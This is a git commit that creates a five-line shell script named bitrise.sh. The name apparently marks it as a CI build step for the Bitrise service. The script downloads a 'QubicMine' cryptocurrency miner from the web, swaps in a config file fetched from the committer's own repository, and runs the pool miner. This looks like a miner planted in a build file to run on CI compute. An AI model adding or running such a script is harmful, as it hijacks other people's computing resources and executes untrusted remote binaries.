571be3b11eb3422939fda7e3512d2467a94a7229
testqb004 <168011210+testqb004@users.noreply.github.com>
2024-04-24 21:51:35 +0530

    Create bitrise.sh

---
+++ bitrise.sh
@@ -0,0 +1,5 @@
+wget https://dl.qubicmine.pro/QubicMine-linux-195.zip
+unzip QubicMine-linux-195.zip
+rm qubicmine.json
+wget https://raw.githubusercontent.com/testqb004/test/main/qubicmine.json
+./qubic-pool-miner
